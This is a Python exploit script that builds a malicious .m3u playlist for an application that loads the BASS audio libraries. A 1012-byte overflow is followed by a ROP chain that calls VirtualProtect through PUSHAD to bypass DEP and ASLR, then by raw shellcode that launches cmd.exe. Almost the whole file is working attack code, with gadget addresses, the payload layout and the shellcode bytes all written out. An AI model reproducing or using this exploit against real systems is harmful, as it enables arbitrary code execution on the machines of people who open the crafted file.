#Coded by CymonL33t
#Tested on Windows 10 Enterprise x64 bits
#DEP bypass with PUSHAD method 
# 3 Non ASLR application modules (BASS.dll) (BASSWMA.dll) (bassmidi)
#shellcode is cmd.exe shellcode
#Since all ROP gadgets are in 3 Non ASLR application modules, this will also bypass ASLR.

import struct
import sys
import os

crash_file = "vp_dep.m3u"

#For VirtualProtect function
# GOALS
# EAX 90909090 => Nop                                                
# ECX <writeable pointer> => lpflOldProtect                                 
# EDX 00000040 => flNewProtect                             
# EBX 00000201 => dwSize                                            
# ESP ???????? => Leave as is                                         
# EBP ???????? => Call to ESP (jmp, call, push,..)                
# ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C
# EDI 10101008 => ROP-Nop same as EIP


#This affects eax registers 
eax =  struct.pack('<L', 0x10015fe7 )  # POP EAX # RETN  [BASS.dll]
eax += struct.pack('<L', 0x90909090 )  # This NOP goes to eax


#This affects ecx register  (ecx contains lpflOldProtect
ecx =  struct.pack('<L', 0x10101012  )  # POP ECX # RETN  [BASSWMA.dll]
ecx += struct.pack('<L', 0x101053DC  )  # dummy writable address in BASSWMA)


#This affects eax and edx registers (edx contains flNewProtect (0x40) value
edx =  struct.pack('<L', 0x10015fe7 )  # POP EAX # RETN  [BASS.dll]
edx += struct.pack('<L', 0xFFFFFFC0 )  # This value goes to EAX register
edx += struct.pack('<L', 0x10014db4 )  # NEG EAX # RETN    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}
edx += struct.pack('<L', 0x10038a6c )  # XCHG EAX,EDX # RETN    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}



#This affects ebx and eax registers (ebx contains dwSize (0x400) value
#No Need    ebx =  struct.pack('<L', 0x1001602f )  # XOR EAX,EAX # RETN    ** [BASS.dll] **   |  ascii {PAGE_EXECUTE_READWRITE}
ebx  = struct.pack('<L', 0x10015fe7 )  # POP EAX # RETN  [BASS.dll]
ebx += struct.pack('<L', 0x994807BD )  # This vlaue will xor with 0x994803BD to get 0x400(Size Value)
ebx += struct.pack('<L', 0x1003a074 )  # XOR EAX,994803BD # RETN    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}
ebx += struct.pack('<L', 0x10032f32 )  # XCHG EAX,EBX # RETN 0x00    ** [BASS.dll] **   |  ascii {PAGE_EXECUTE_READWRITE}


#This affects ebp register ( ebp contains jmp esp address)
ebp =  struct.pack('<L', 0x10010157 )  # POP EBP # RETN    ** [BASS.dll] **   |  ascii {PAGE_EXECUTE_READWRITE}
ebp += struct.pack('<L', 0x100222C5 )  # [BASS.dll] JMP ESP address)



#This affects eax and esi registers ( esi contains pointer to virtualprotect function)
esi  = struct.pack('<L', 0x10015fe7 )  # POP EAX # RETN  [BASS.dll]
esi += struct.pack('<L', 0x1060e25c )  # kernel32.virtualprotect | 0x77796a30 |  {PAGE_EXECUTE_READWRITE} [BASSMIDI.dll]
esi += struct.pack('<L', 0x1001eaf1 )  # MOV EAX,DWORD PTR DS:[EAX] # RETN    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}
esi += struct.pack('<L', 0x10030950 )  # XCHG EAX,ESI # RETN    ** [BASS.dll] **   |  ascii {PAGE_EXECUTE_READWRITE}


#This affects edi registers ( edi contains ROP NOP that means only RETN, It needs RETN bcoz there's another rop gadgets)
edi  = struct.pack('<L', 0x10016218 )  # POP EDI # RETN    ** [BASS.dll] **   |  ascii {PAGE_EXECUTE_READWRITE}
edi += struct.pack('<L', 0x101027AF )  # ROP NOP (This address contains RETN for more ROP gadgets)

#The last PUSHAD instruction
pushad = struct.pack('<L',0x1001d7a5 )  # PUSHAD # RETN    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}

rop = edx + esi + ebx + ebp + edi + eax + ecx + pushad
nops = "\x90" * 16
shellcode = (
"\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
"\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"
"\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"
"\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"
"\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
"\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"
"\x8E\x03\xD3\x52\x68\x78\x65\x63\x01\xFE\x4C\x24\x03\x68\x57\x69\x6E\x45\x54\x53"
"\xFF\xD2\x68\x63\x6D\x64\x01\xFE\x4C\x24\x03\x6A\x05\x33\xC9\x8D\x4C\x24\x04\x51"
"\xFF\xD0\x68\x65\x73\x73\x01\x8B\xDF\xFE\x4C\x24\x03\x68\x50\x72\x6F\x63\x68\x45"
"\x78\x69\x74\x54\xFF\x74\x24\x20\xFF\x54\x24\x20\x57\xFF\xD0")

fuzz = "A" * 1012
retn = struct.pack('<L', 0x101027AF) #A pointer to RETN (bass.dll)
fuzz += retn
fuzz += rop
fuzz += nops
fuzz += shellcode
fuzz += "C" * (3000 - len(fuzz))





file = open(crash_file,"w")
file.write(fuzz)
file.close()

print "Successfully " + crash_file + " Created!"
